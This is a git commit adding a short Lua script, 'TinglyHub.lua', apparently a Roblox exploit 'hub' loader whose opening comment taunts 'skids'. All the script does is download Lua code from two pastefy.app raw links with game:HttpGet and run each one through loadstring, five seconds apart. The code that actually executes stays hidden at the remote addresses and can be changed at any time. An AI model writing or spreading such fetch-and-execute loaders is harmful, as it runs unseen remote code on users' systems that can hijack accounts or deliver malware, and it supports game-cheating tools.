c9819638cb5c6cc5badfe1cc15fabc001959f94a
Tinglyhubowneristouritobtw <tarifyoussef98@gmail.com>
2026-02-28 13:22:44 +0000

    Create TinglyHub.lua

---
+++ TinglyHub.lua
@@ -0,0 +1,10 @@
+-- I See you skids
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/134M2A5z/raw"))()
+end)
+
+task.wait(5) 
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/U6zFeKgn/raw"))()
+end)
